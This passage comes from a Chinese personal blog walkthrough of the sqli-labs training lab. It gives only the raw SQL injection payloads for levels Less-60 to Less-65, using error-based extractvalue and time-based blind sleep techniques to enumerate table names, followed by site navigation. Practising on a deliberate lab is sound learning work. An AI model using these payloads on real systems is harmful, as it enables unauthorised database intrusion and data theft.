<h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;)union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),1,1))=79,0,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),1,1))=77,0,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1))and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;), 1,1))=79,0,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),1,1))=79,0,sleep(10))--+</span><br></pre></td></tr></table></figure>

<p>完结撒花!</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/03/sqli-labs/">http://example.com/2025/04/03/sqli-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a><a class="post-meta__tags" href="/tags/mysql/">mysql</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XYCTF2025</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/06/08/HNCTF2025/" title="HNCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-08</div><div class="info-item-2">HNCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-challenges"><span class="toc-number">1.</span> <span class="toc-text">Basic challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">1.2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">1.3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">1.4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">1.5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">1.6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">1.7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">1.8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">1.9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.11.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">1.12.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">1.13.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">1.14.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">1.15.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">1.16.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">1.17.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">1.18.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">1.19.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">1.20.</span> <span class="toc-text">Less-20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.21.</span> <span class="toc-text">Less-21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">1.22.</span> <span class="toc-text">Less-22</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-injection"><span class="toc-number">2.</span> <span class="toc-text">Advanced injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">2.1.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24"><span class="toc-number">2.2.</span> <span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25"><span class="toc-number">2.3.</span> <span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a"><span class="toc-number">2.4.</span> <span class="toc-text">Less-25a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26"><span class="toc-number">2.5.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26a"><span class="toc-number">2.6.</span> <span class="toc-text">Less-26a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27"><span class="toc-number">2.7.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27a"><span class="toc-number">2.8.</span> <span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28"><span class="toc-number">2.9.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28a"><span class="toc-number">2.10.</span> <span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-29"><span class="toc-number">2.11.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-30"><span class="toc-number">2.12.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-31"><span class="toc-number">2.13.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32"><span class="toc-number">2.14.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-33"><span class="toc-number">2.15.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-34"><span class="toc-number">2.16.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-35"><span class="toc-number">2.17.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-36"><span class="toc-number">2.18.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-37"><span class="toc-number">2.19.</span> <span class="toc-text">Less-37</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stacked-injection"><span class="toc-number">3.</span> <span class="toc-text">Stacked injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38"><span class="toc-number">3.1.</span> <span class="toc-text">Less-38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-39"><span class="toc-number">3.2.</span> <span class="toc-text">Less-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-40"><span class="toc-number">3.3.</span> <span class="toc-text">Less-40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-41"><span class="toc-number">3.4.</span> <span class="toc-text">Less-41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-42"><span class="toc-number">3.5.</span> <span class="toc-text">Less-42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-43"><span class="toc-number">3.6.</span> <span class="toc-text">Less-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-44"><span class="toc-number">3.7.</span> <span class="toc-text">Less-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-45"><span class="toc-number">3.8.</span> <span class="toc-text">Less-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-46"><span class="toc-number">3.9.</span> <span class="toc-text">Less-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-47"><span class="toc-number">3.10.</span> <span class="toc-text">Less-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-48"><span class="toc-number">3.11.</span> <span class="toc-text">Less-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-49"><span class="toc-number">3.12.</span> <span class="toc-text">Less-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-50"><span class="toc-number">3.13.</span> <span class="toc-text">Less-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-51"><span class="toc-number">3.14.</span> <span class="toc-text">Less-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-52"><span class="toc-number">3.15.</span> <span class="toc-text">Less-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-53"><span class="toc-number">3.16.</span> <span class="toc-text">Less-53</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">4.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54"><span class="toc-number">4.1.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-55"><span class="toc-number">4.2.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-56"><span class="toc-number">4.3.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-57"><span class="toc-number">4.4.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-58"><span class="toc-number">4.5.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-59"><span class="toc-number">4.6.</span> <span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-60"><span class="toc-number">4.7.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-61"><span class="toc-number">4.8.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-62"><span class="toc-number">4.9.</span> <span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-63"><span class="toc-number">4.10.</span> <span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-64"><span class="toc-number">4.11.</span> <span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-65"><span class="toc-number">4.12.</span> <span class="toc-text">Less-65</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/08/HNCTF2025/" title="HNCTF2025">HNCTF2025</a><time datetime="2025-06-08T15:37:49.000Z" title="发表于 2025-06-08 23:37:49">2025-06-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/D3CTF2025/" title="D3CTF2025">D3CTF2025</a><time datetime="2025-06-04T06:10:33.000Z" title="发表于 2025-06-04 14:10:33">2025-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/28/nssctf-pwn%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="nssctf-pwn入门题单">nssctf-pwn入门题单</a><time datetime="2025-05-28T01:35:03.000Z" title="发表于 2025-05-28 09:35:03">2025-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/LitCTF2025/" title="LitCTF2025">LitCTF2025</a><time datetime="2025-05-26T08:13:36.000Z" title="发表于 2025-05-26 16:13:36">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">python反序列化</a><time datetime="2025-05-08T06:37:06.000Z" title="发表于 2025-05-08 14:37:06">2025-05-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>